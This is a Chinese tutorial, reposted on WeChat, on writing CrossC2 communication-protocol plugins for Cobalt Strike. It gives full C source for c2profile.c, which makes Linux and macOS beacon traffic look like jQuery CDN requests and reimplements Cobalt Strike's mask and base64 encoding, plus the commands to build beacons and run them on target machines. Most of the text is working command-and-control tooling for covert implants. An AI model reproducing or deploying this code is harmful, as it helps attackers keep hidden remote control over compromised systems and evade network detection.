##  CrossC2通信协议API的实践

RichardTang  [ 台下言书 ](javascript:void\(0\);)

**台下言书** ![]()

微信号 taixiayanshu

功能介绍 stay hungry ,stay foolish.

____

__

收录于话题

# 之前在内部分享会上看到，感觉讲的很详细了，力荐一下。

#

本文取得RichardTang师傅授权转载，首发于先知社区。

* * *

  

# 前言

在讲解CrossC2的通信API之前感觉有必要先说一下基础的用法，另外有错误欢迎指正（毕竟我是真的菜）。

# CrossC2

## 介绍

简单说CrossC2能让你的CobaltStrike支持Linux/MacOS/Android/IOS平台的Beacon上线。

CrossC2-GitHub地址

## 实验环境

  * CobaltStrike4.1

  * CentOS7与MacOS

  * CrossC2 - 2.2.2版(https://github.com/gloxec/CrossC2)

  * C2-Profile(https://github.com/threatexpress/malleable-c2)

## 基本使用

先将CrossC2主分支克隆到自己电脑上

    
    
    git clone https://github.com/gloxec/CrossC2.git  
    

找到CrossC2.cna文件，在`src/`目录下，修改该文件中的两项值。

    
    
    $CC2_PATH = "/Users/xxx/Desktop/Tools/cs_plugin/CrossC2/2.2.2/src"; # 这里填src目录的绝对路径  
    $CC2_BIN = "genCrossC2.MacOS"; # 根据系统类型进行配置,对应src目录下的genCrossC2.XXX那三个文件的名字

将TeamServer上的`.cobaltstrike.beacon_keys`文件下回到本地，之后会用上(我这里将文件名前边的点去掉了)。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100030.png)

启动你的TeamServer， **这里先不要带上C2-Profile去启动。  
**

![](https://gitee.com/fuli009/images/raw/master/public/20210805100031.png)

 ****  

将`CrossC2.cna`文件加载到CobaltStrike中，之后创建`Https`监听器。  

![](https://gitee.com/fuli009/images/raw/master/public/20210805100032.png)

生成Beacon，命令如下(如果你是Windows那就是genCrossC2.Win.exe)。

`./genCrossC2.MacOS [TeamServer的IP] [HTTPS监听器端口]
[.cobaltstrike.beacon_keys文件路径] [自定义的动态链接库文件] [运行Beacon的平台] [运行Beacon的平台位数]
[输出的结果文件]`

    
    
    ./genCrossC2.MacOS 192.168.225.24 1443 cobaltstrike.beacon_keys null Linux x64 ./test  
    

将生成的Beacon放到目标机器上去执行即可

![](https://gitee.com/fuli009/images/raw/master/public/20210805100033.png)

  

此时你的TeamServer即可支持Windows、Linux...

![]()

# 存在的问题

上述操作是未带C2-Profile，实战里相信没有师傅会不带C2-Profile就直接冲吧！

![](https://gitee.com/fuli009/images/raw/master/public/20210805100034.png)

直接带上C2-Profile，CrossC2所生成的Beacon可能无法上线也可能是上线了执行不了命令（这里可以自己尝试一下）。因此CrossC2提供通信协议API的方式来解决该问题。

# 一些铺垫

在进入正题之前感觉有必要铺垫以下知识点

## 有Profile与无Profile对比

先对比一下带Profile和不带Profile时传递的数据包的差异，这里我以jquery-c2.4.0.profile默认配置为例进行解释。

下图是Beacon向TeamServer发送请求，TeamServer做回应。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100035.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210805100036.png)

C2-Profile

C2-Profile文件决定了你对元数据使用哪些编码、哪种顺序、拼接哪些字符……，所以这里需要你对它的配置有一些了解。

以`jquery-c2.4.0.profile`默认配置为例，当Beacon要发送一个POST请求给TeamServer时会以`http-post
{...}`的配置为准，Beacon发送GET请求给TeamServer时以`http-get {...}`的配置为准。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100037.png)

下图为对配置的含义粗略的解释

![](https://gitee.com/fuli009/images/raw/master/public/20210805100038.png)

  

其中`output {...}`，表示元数据的处理流程。  

    
    
    output {  
                mask;  
                base64url;  
                # 2nd Line  
                prepend "!function(e,t){\"use strict\"; ...... },P=\"\r";  
                # 1st Line  
                prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";  
                append "\".(o=t.documentElement,Math.max(t.body[ ...... (e.jQuery=e.$=w),w});";  
                print;  
    }  
    

过程是从上往下，对应的伪代码为: `prepend + prepend + baseurl(mask(metadata)) + append`
处理完后进行响应(`print`)。对应的`http-get {...}`也是一样的逻辑。所以上述处理完后就对应下图中的数据包

![](https://gitee.com/fuli009/images/raw/master/public/20210805100039.png)

## 元数据  

 **此处元数据的概念为个人理解**

这里的元数据指的是还未进行处理的数据(明文)，就是CobaltStrike的官方文档中所描述的metadata，但是metadata实际应该是经过`AES`处理后的一个值，本质上和下图的是同一个，当然metadata中可能还封装了一些其他数据。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100041.png)

## 元数据处理流程  

那么元数据在发送出去前是经过了哪些处理呢？

下边为我画的一张流程图，即发送和接收的处理过程。(图中不包含秘钥交换的过程，更为详细可以参考CobaltStrike协议全析)

数据的流向可以是TeamServer流向Beacon，也可以是Beacon流向TeamServer，不同方向传输使用协议不一样，但是处理元数据的流程是一致的。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100042.png)

# CrossC2通信协议API  

CrossC2提供了一个c2profile.c文件，在该文件内编写相应的c代码，然后打包成.so文件，在使用`./genCrossC2.MacOS`时指定编译好的.so文件。这样生成的Beacon就可以按照c编写的逻辑构造数据包和解码数据包。

其中还提供了一个https.profile，和默认的c2profile.c文件是配对的，可以直接使用。只需要按照下边的命令执操作即可

    
    
    ./teamserver 192.168.225.24 123456 https.profile  
    
    
    
    gcc c2profile.c -fPIC -shared -o lib_rebind_test.so  
    ./genCrossC2.MacOS 192.168.225.24 1443 cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 ./test  
    

## 通信函数介绍

  * Beacon向TeamServer发送数据时触发

    * cc2_rebind_http_get_send

    * cc2_rebind_http_post_send

  * Beacon接收TeamServer响应的数据时触发

    * cc2_rebind_http_get_recv

    * cc2_rebind_http_post_recv

  * 查找有用的数据部分

    * find_payload

## find_payload

该函数用来取出有用的那部分数据，prepend和append部分拼接的数据只是为了达到伪装的效果，实际上传输的真正数据部分也就`baseurl(mask(metadata))`部分。

prepend + prepend + `baseurl(mask(metadata))` \+ append 对应下图红框部分

![](https://gitee.com/fuli009/images/raw/master/public/20210805100043.png)

它的使用很简单，只需要标记要切割部分数据的开始和结尾即可。  

![](https://gitee.com/fuli009/images/raw/master/public/20210805100045.png)

## 编码解码梳理

C2-Profile的`server { ... output { ... } }`中描述了TeamServer响应的数据是如何编码的

![](https://gitee.com/fuli009/images/raw/master/public/20210805100046.png)

那么这里就需要在c2profile.c文件的`cc2_rebind_http_post_recv`函数中实现`base64_encode(decode_mask(base64_decode(find_payload(data))))`(这里是伪代码)，这样即可拿到被AES加密的元数据，随后将元数据再进行base64编码后向下传递。  

同样的`client
{...}`中描述了Beacon发送给TeamServer的数据是如何编码的，那么在发送给TeamServer之前就需要按Profile中的配置进行编码，那么意味着我们需要在`cc2_rebind_http_post_send`中实现`base64_encode(mask_encode(base64_decode(x)))`的操作。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100047.png)

同样的`http-get { ... }`配置处的实现思路也是一样的  

TeamServer会根据Profile中配置的这个顺序从下往上进行解密拿到AES加密的元数据,这个过程TeamServer在内部已经实现了。而CrossC2生成的Beacon是不会根据Profile中的配置进行生成的，所以需要手动编写编码和解码的部分。

## 带上C2-Profile重启TeamServer

    
    
    ./teamserver 192.168.225.24 123456 jquery-c2.4.0.profile  
    

## 实现方式1

将C2-Profile中的mask编码去掉，下图只截了`http-post`，还需要去掉`http-get`部分的mask。

![]()

之后来编写c2profile.c文件  

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <string.h>  
    #include <unistd.h>  
      
    void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {  
        char *requestBody = "GET /%s HTTP/1.1\r\n"  
                            "Host: code.jquery.comr\n"  
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"  
                            "Accept-Encoding: gzip, deflate\r\n"  
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"  
                            "Cookie: __cfduid=%s\r\n"  
                            "Referer: http://code.jquery.com/\r\n"  
                            "Connection: close\r\n\r\n";  
        char postPayload[20000];  
        sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);  
      
        *outputData_len =  strlen(postPayload);  
        *outputData = (char *)calloc(1,  *outputData_len);  
        memcpy(*outputData, postPayload, *outputData_len);  
      
    }  
      
    void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {  
        char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"  
                            "Host: code.jquery.com\r\n"  
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"  
                            "Accept-Encoding: gzip, deflate\r\n"  
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"  
                            "Referer: http://code.jquery.com/\r\n"  
                            "Connection: close\r\n"  
                            "Content-Length: %d\r\n\r\n%s";  
        char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);  
        sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);  
      
        *outputData_len =  strlen(postPayload);  
        *outputData = (char *)calloc(1,  *outputData_len);  
        memcpy(*outputData, postPayload, *outputData_len);  
        free(postPayload);  
    }  
      
    char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {  
      
        rawData = strstr(rawData, start) + strlen(start);  
      
        *payload_len = strlen(rawData) - strlen(strstr(rawData, end));  
      
        char *payload = (char *)calloc(*payload_len ,sizeof(char));  
        memcpy(payload, rawData, *payload_len);  
        return payload;  
    }  
      
    void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {  
        char *start = "return-1},P=\"\r";  
        char *end = "\".(o=t.documentElement";  
      
        long long payload_len = 0;  
        *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);  
        *outputData_len = payload_len;  
    }  
      
    void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {  
        char *start = "return-1},P=\"\r";  
        char *end = "\".(o=t.documentElement";  
      
        long long payload_len = 0;  
        *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);  
        *outputData_len = payload_len;  
    }  
    

将`c2profile.c`文件编译成`.so`文件

    
    
    gcc c2profile.c -fPIC -shared -o lib_rebind_test.so  
    

指定.so文件生成Beacon文件

    
    
    ./genCrossC2.MacOS 192.168.225.24 1443 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 ./test  
    

运行上线，此时在带C2-Profile的情况下能正常上线CrossC2的Beacon。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100048.png)

## 实现方式2  

在不去掉C2-Profile中的Mask编码，需要自己实现Mask的编码和解码逻辑方式如下。

非专业写c全靠临时百度硬编出来的，轻点喷。

    
    
    #include <stdio.h>  
    #include <stdlib.h>  
    #include <string.h>  
    #include <unistd.h>  
    #include <time.h>  
      
    static const char *BASE64_STR_CODE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";  
    static const short BASE64_INT_CODE[] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,  
                                            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,  
                                            -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1,  
                                            -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,  
                                            17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30,  
                                            31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50,  
                                            51};  
    static const short BASE64_INT_LENGTH = sizeof(BASE64_INT_CODE) / sizeof(BASE64_INT_CODE[0]);  
      
    void base64_decode_to_ascii(char *base64Str, long res[]) {  
        int i = 0;  
        int j = 0;  
        int v1 = 0;  
        int v2 = 0;  
        int v3 = 0;  
        int base64StrLength = strlen(base64Str);  
      
        for (i = 0; i < base64StrLength; ++i) {  
            char ascii = base64Str[i];  
            if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {  
                break;  
            } else {  
                if (ascii == '=') {  
                    ++v3;  
                    v1 <<= 6;  
                    ++v2;  
                    switch (v2) {  
                        case 1:  
                        case 2:  
                            return;  
                        case 3:  
                            break;  
                        case 4:  
                            res[j++] = (char) (v1 >> 16);  
                            if (v3 == 1) {  
                                res[j++] = (char) (v1 >> 8);  
                            }  
                            break;  
                        case 5:  
                            return;  
                        default:  
                            return;  
                    }  
                } else {  
                    if (v3 > 0) {  
                        return;  
                    }  
      
                    if (ascii >= 0 && ascii < BASE64_INT_LENGTH) {  
                        short v4 = BASE64_INT_CODE[ascii];  
                        if (v4 >= 0) {  
                            v1 = (v1 << 6) + v4;  
                            ++v2;  
                            if (v2 == 4) {  
                                res[j++] = (char) (v1 >> 16);  
                                res[j++] = (char) (v1 >> 8 & 255);  
                                res[j++] = (char) (v1 & 255);  
                                v1 = 0;  
                                v2 = 0;  
                            }  
                            continue;  
                        }  
                    }  
      
                    if (ascii == 0x20 | ascii == '\n' | ascii == '\t') {  
                        return;  
                    }  
                }  
            }  
        }  
    }  
      
    void ascii_to_base64_encode(long ascii[], unsigned long asciiLength, char res[]) {  
        long i = 0;  
        long j = 0;  
        long v1 = 0;  
        long v2 = 0;  
        long v3 = 0;  
        long v6 = 0;  
      
        for (i = 0; i < asciiLength; ++i) {  
            v6 = ascii[v1++];  
            if (v6 < 0) {  
                v6 += 256;  
            }  
      
            v2 = (v2 << 8) + v6;  
            ++v3;  
            if (v3 == 3) {  
                res[j++] = BASE64_STR_CODE[v2 >> 18];  
                res[j++] = BASE64_STR_CODE[v2 >> 12 & 63];  
                res[j++] = BASE64_STR_CODE[v2 >> 6 & 63];  
                res[j++] = BASE64_STR_CODE[v2 & 63];  
                v2 = 0;  
                v3 = 0;  
            }  
        }  
      
        if (v3 > 0) {  
            if (v3 == 1) {  
                res[j++] = BASE64_STR_CODE[v2 >> 2];  
                res[j++] = BASE64_STR_CODE[v2 << 4 & 63];  
                res[j++] = (unsigned char) '=';  
            } else {  
                res[j++] = BASE64_STR_CODE[v2 >> 10];  
                res[j++] = BASE64_STR_CODE[v2 >> 4 & 63];  
                res[j++] = BASE64_STR_CODE[v2 << 2 & 63];  
            }  
            res[j] = (unsigned char) '=';  
        }  
    }  
      
    unsigned long get_base64_decode_length(char *base64Str) {  
        long num;  
        long base64StrLength = strlen(base64Str);  
        if (strstr(base64Str, "==")) {  
            num = base64StrLength / 4 * 3 - 2;  
        } else if (strstr(base64Str, "=")) {  
            num = base64StrLength / 4 * 3 - 1;  
        } else {  
            num = base64StrLength / 4 * 3;  
        }  
        return sizeof(unsigned char) * num;  
    }  
      
    unsigned long get_base64_encode_length(long strLen) {  
        long num;  
        if (strLen % 3 == 0) {  
            num = strLen / 3 * 4;  
        } else {  
            num = (strLen / 3 + 1) * 4;  
        }  
        return sizeof(unsigned char) * num;  
    }  
      
    void mask_decode(long ascii[], unsigned long asciiLength, long res[]) {  
        long i = 0;  
        long j = 0;  
        short key[4] = {  
                ascii[0],  
                ascii[1],  
                ascii[2],  
                ascii[3]  
        };  
        for (i = 4; i < asciiLength; ++i) {  
            res[j] = ascii[i] ^ key[j % 4];  
            j++;  
        }  
    }  
      
    void mask_encode(long ascii[], unsigned long asciiLength, long res[]) {  
        long i = 0;  
        srand(time(NULL));  
        short key[4] = {  
                (char) (rand() % 255),  
                (char) (rand() % 255),  
                (char) (rand() % 255),  
                (char) (rand() % 255)  
        };  
        res[0] = key[0];  
        res[1] = key[1];  
        res[2] = key[2];  
        res[3] = key[3];  
        for (i = 4; i < asciiLength; i++) {  
            res[i] = ascii[i - 4] ^ key[i % 4];  
        }  
    }  
      
    char *fix_reverse(char *str) {  
        int i = 0;  
        unsigned long strLength = strlen(str);  
        char *res = calloc(strLength + 4, strLength + 4);  
        for (i = 0; i < strLength; ++i) {  
            if (str[i] == '_') {  
                res[i] = '/';  
            } else if (str[i] == '-') {  
                res[i] = '+';  
            } else {  
                res[i] = str[i];  
            }  
        }  
        while (strlen(res) % 4 != 0) {  
            res[strLength++] = '=';  
        }  
        res[strlen(res) + 1] = '\0';  
        return res;  
    }  
      
    char *fix(char *str) {  
        int i;  
        unsigned long strLength = strlen(str);  
        char *res = calloc(strLength, strLength);  
        for (i = 0; i < strLength; i++) {  
            if (str[i] == '/') {  
                res[i] = '_';  
            } else if (str[i] == '+') {  
                res[i] = '-';  
            } else if (str[i] == '=') {  
                continue;  
            } else {  
                res[i] = str[i];  
            }  
        }  
        return res;  
    }  
      
    char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {  
        rawData = strstr(rawData, start) + strlen(start);  
      
        *payload_len = strlen(rawData) - strlen(strstr(rawData, end));  
      
        char *payload = (char *) calloc(*payload_len, sizeof(char));  
        memcpy(payload, rawData, *payload_len);  
        return payload;  
    }  
      
    char *cc2_rebind_http_post_send_param(char *data) {  
        unsigned long base64DecodeLength = get_base64_decode_length(data);  
      
        long base64DecodeRes[base64DecodeLength];  
        memset(base64DecodeRes, 0, base64DecodeLength);  
        base64_decode_to_ascii(data, base64DecodeRes);  
      
        long maskEncodeRes[base64DecodeLength + 4];  
        memset(maskEncodeRes, 0, base64DecodeLength + 4);  
        mask_encode(base64DecodeRes, base64DecodeLength + 4, maskEncodeRes);  
      
        unsigned long base64EncodeLength = get_base64_encode_length(sizeof(maskEncodeRes) / sizeof(maskEncodeRes[0]));  
        char *result = calloc(base64EncodeLength, base64EncodeLength);  
        ascii_to_base64_encode(maskEncodeRes, base64DecodeLength + 4, result);  
      
        return result;  
    }  
      
    char *cc2_rebind_http_recv_param(char *payload) {  
        char *data = fix_reverse(payload);  
      
        unsigned long base64DecodeLength = get_base64_decode_length(data);  
        long base64DecodeRes[base64DecodeLength];  
        memset(base64DecodeRes, 0, base64DecodeLength);  
        base64_decode_to_ascii(data, base64DecodeRes);  
      
        long maskDecodeRes[base64DecodeLength - 4];  
        memset(maskDecodeRes, 0, base64DecodeLength - 4);  
        mask_decode(base64DecodeRes, base64DecodeLength, maskDecodeRes);  
      
        unsigned long base64EncodeLength = get_base64_encode_length(base64DecodeLength - 4);  
        char *result = calloc(base64EncodeLength, base64EncodeLength);  
        ascii_to_base64_encode(maskDecodeRes, base64DecodeLength - 4, result);  
      
        return result;  
    }  
      
    void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {  
        char *requestBody = "GET /%s HTTP/1.1\r\n"  
                            "Host: code.jquery.comr\n"  
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"  
                            "Accept-Encoding: gzip, deflate\r\n"  
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"  
                            "Cookie: __cfduid=%s\r\n"  
                            "Referer: http://code.jquery.com/\r\n"  
                            "Connection: close\r\n\r\n";  
      
        char postPayload[20000];  
        sprintf(postPayload, requestBody, "jquery-3.3.1.min.js", reqData);  
      
        *outputData_len = strlen(postPayload);  
        *outputData = (char *) calloc(1, *outputData_len);  
        memcpy(*outputData, postPayload, *outputData_len);  
    }  
      
    void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {  
        char *requestBody = "POST /%s?__cfduid=%s HTTP/1.1\r\n"  
                            "Host: code.jquery.com\r\n"  
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"  
                            "Accept-Encoding: gzip, deflate\r\n"  
                            "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n"  
                            "Referer: http://code.jquery.com/\r\n"  
                            "Connection: close\r\n"  
                            "Content-Length: %d\r\n\r\n%s";  
      
        id = cc2_rebind_http_post_send_param(id);  
        reqData = cc2_rebind_http_post_send_param(reqData);  
      
        char *postPayload = (char *) calloc(1, strlen(requestBody) + strlen(reqData) + 200);  
      
        sprintf(postPayload, requestBody, "jquery-3.3.2.min.js", id, strlen(reqData), reqData);  
        *outputData_len = strlen(postPayload);  
        *outputData = (char *) calloc(1, *outputData_len);  
      
        memcpy(*outputData, postPayload, *outputData_len);  
        free(postPayload);  
    }  
      
    void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {  
        char *start = "return-1},P=\"\r";  
        char *end = "\".(o=t.documentElement";  
      
        long long payload_len = 0;  
        char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);  
      
        *outputData = cc2_rebind_http_recv_param(payload);  
        *outputData_len = strlen(*outputData);  
    }  
      
    void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {  
        char *start = "return-1},P=\"\r";  
        char *end = "\".(o=t.documentElement";  
      
        long long payload_len = 0;  
        char *payload = find_payload(rawData, rawData_len, start, end, &payload_len);  
      
        *outputData = cc2_rebind_http_recv_param(payload);  
        *outputData_len = strlen(*outputData);  
    }  
    

同样的编译成so文件，在生成Beacon时指定so文件。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100049.png)

# 难点和疑问  

## 编码解码函数的实现思路

在编写c2profile.c文件的过程中，用到Base64、Mask的相关编码和解码函数。

但是在实际实践过程中会发现，从网上找到的c版Base64编码解码函数是不能直接套用的，同时Mask编码解码为CobaltStrike中自实现的相关函数。

查阅CobaltStrike文档会发现，对这些编码有进行相关描述，当时文档中是没有给出具体细节的。所以这里需要借助https://github.com/mai1zhi2/CobaltstrikeSource来查看具体的函数实现。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100050.png)

只需要在CobaltStrike的源码中找到对应的函数实现，然后C代码照猫画虎的方式，最后再调试调试就可以实现了。  

![](https://gitee.com/fuli009/images/raw/master/public/20210805100051.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210805100052.png)

同样可以参照该思路实现netbios的编码解码，嫌麻烦不想折腾可以只使用实现方式1。

## 处理后的元数据为什么还需要进行一次Base64

https://github.com/gloxec/CrossC2/issues/89，作者也提供了回答。

![](https://gitee.com/fuli009/images/raw/master/public/20210805100053.png)

其实也可以在c2profile.c中通过printf函数打印参数值，就会发现传递进来的函数值是base64编码，那么正常你在使用CrossC2提供的demo文件时会发现，他在c2profile.c中没有对参数进行编码解码操作，意味着往下传递的参数就是base64形式的参数值。所以我们在处理完结果后应该已base64方式进行向下传递  

## http-post中的server output

实际上会发现CrossC2提供的https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile文件中有看到使用Mask编码，但是提供的https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c文件中没有关于Mask的操作，关于这个问题可以参考issue。作者给的答复:
`实际目前server响应的post包并不带任何有效数据`，你品你细品。

c2profile.c的代码放到https://github.com/Richard-
Tang/CrossC2-C2Profile，其实就是实现方式2里的那段代码。

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读原文

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

CrossC2通信协议API的实践

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

